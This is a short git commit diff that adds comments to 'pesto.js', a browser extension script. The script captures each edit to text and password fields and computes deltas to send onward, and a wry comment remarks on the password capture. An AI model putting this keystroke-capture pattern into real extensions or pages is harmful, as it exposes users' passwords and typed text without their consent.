5eda7a1b825fd0032d539e88b0993ee8d9e28a51
Jói Sigurðsson <joi@joisig.com>
2013-06-25 17:20:23 +0200

    Update pesto.js

--- pesto_extension/pesto/pesto.js
+++ pesto_extension/pesto/pesto.js
@@ -1,8 +1,11 @@
-
+// type=password: Slow clap :)
 $(document).on('input', 'input[type=text],input[type=password],textarea', function (e) {
     var old = $(this).attr('data-old-value') || '',
         cur = $(this).val() || '';
 
+    // This deserves a comment: Find longest common prefix and send delta. If old
+    // string has stuff beyond longest common prefix, send indications of how
+    // many characters were deleted.
     var at = 0;
     while (at < old.length && at < cur.length && old[at] == cur[at]) at++;
     var diff = '';
